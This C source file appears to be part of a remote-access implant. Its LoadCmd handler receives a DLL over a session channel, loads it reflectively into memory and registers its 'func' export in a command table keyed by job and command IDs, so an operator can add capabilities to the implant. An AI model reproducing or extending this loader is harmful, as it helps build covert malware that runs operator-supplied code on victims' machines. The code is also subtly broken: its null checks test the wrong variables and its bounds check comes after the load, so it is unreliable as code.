#include "commands.h"
#include "debug.h"
#include "loader.h"
#include "session.h"

extern SESSION_CTX session_ctx;

/*
@brief Function that loads a dll into memory and resolves its dependencies
@param PMESSAGE containts the parameters for the command
@param PMESSAGE is a pointer to the result that will be sent back
@return ERROR_T with status of load
*/
ERROR_T LoadCmd(PMESSAGE pMsg, PMESSAGE *pResult) {
    INT iError = E_SUCCESS;
    PDWORD pDLLFileLen = NULL;
    PBYTE pDLLFile = NULL;
    PVOID pFuncAddr = NULL;
    PVOID pDLLAddr = NULL;

    *pResult = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MESSAGE));
    if (NULL == pResult) {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    pDLLFileLen = (PDWORD) pMsg->pData;
    pDLLFile = (PCHAR) ((PBYTE) pDLLFileLen + sizeof(DWORD));

    pDLLAddr = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pDLLFileLen);
    if (NULL == pFuncAddr)
    {
        iError = E_MEMORY_ERROR;
        goto end;
    }

    memcpy(pDLLAddr, pDLLFile, *pDLLFileLen);

    pFuncAddr = LoadMemoryModule(pDLLAddr, "func");

    if ((FUNCARRAYSIZE - 1) < pMsg->hdr.dwCommand)
    {
        iError = E_CMD_NOT_FOUND;
        DBG_PRINT("Command not found\n");
        goto end;
    }
    session_ctx.pFuncArray[pMsg->hdr.dwCommand] = pFuncAddr;

    DBG_PRINT("Loading module %d with size: %d\n", pMsg->hdr.dwCommand,  *pDLLFileLen);

end:
    (*pResult)->hdr.dwCommand = pMsg->hdr.dwCommand;
    (*pResult)->hdr.dwJobID = pMsg->hdr.dwJobID;
    (*pResult)->hdr.dwMessageSize = sizeof(MESSAGE_HEADER);
    (*pResult)->hdr.dwResultCode = iError;

    return iError;
}